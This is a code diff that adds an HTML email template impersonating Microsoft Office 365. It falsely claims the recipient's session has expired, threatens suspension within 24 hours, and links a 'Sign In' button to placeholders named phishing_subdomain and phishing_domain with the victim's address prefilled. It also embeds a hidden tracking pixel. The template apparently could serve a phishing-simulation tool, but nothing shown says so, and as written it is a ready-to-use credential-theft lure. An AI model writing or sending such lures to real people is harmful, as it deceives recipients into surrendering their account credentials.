@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Microsoft Office 365 - Sign-in Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f3f2f1; }
+        .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 2px; overflow: hidden; }
+        .header { background: #0078d4; padding: 20px; color: white; }
+        .content { padding: 30px; line-height: 1.6; }
+        .button { display: inline-block; background: #0078d4; color: white; padding: 12px 24px; text-decoration: none; border-radius: 2px; margin: 20px 0; }
+        .footer { background: #f8f8f8; padding: 20px; font-size: 12px; color: #666; }
+        .urgent { color: #d13438; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>Microsoft Office 365</h2>
+        </div>
+        <div class="content">
+            <p>Hello {{ first_name | default('User') }},</p>
+            
+            <p class="urgent">ACTION REQUIRED: Your Office 365 session has expired</p>
+            
+            <p>We've detected that your Office 365 session for <strong>{{ email }}</strong> has expired due to security policy updates. To continue accessing your email and documents, please sign in again within the next 24 hours.</p>
+            
+            <p>If you don't verify your account within this timeframe, access to your Office 365 services will be temporarily suspended for security reasons.</p>
+            
+            <center>
+                <a href="https://{{ phishing_subdomain }}.{{ phishing_domain }}/login?user={{ email | urlencode }}&ref=email" class="button">Sign In to Office 365</a>
+            </center>
+            
+            <p><small>If you're unable to click the button above, copy and paste this link into your browser:<br>
+            https://{{ phishing_subdomain }}.{{ phishing_domain }}/login?user={{ email | urlencode }}&ref=email</small></p>
+            
+            <p>Thank you for your cooperation in keeping your account secure.</p>
+            
+            <p>Best regards,<br>
+            Microsoft Account Security Team</p>
+        </div>
+        <div class="footer">
+            <p>Microsoft Corporation | One Microsoft Way | Redmond, WA 98052</p>
+            <p>This message was sent to {{ email }}. If you don't want to receive these emails, you can <a href="#">unsubscribe</a>.</p>
+        </div>
+    </div>
+    
+    <!-- Tracking pixel -->
+    <img src="https://{{ phishing_subdomain }}.{{ phishing_domain }}/px/{{ tracking_id }}.png" width="1" height="1" style="display:none;">
+</body>
+</html>
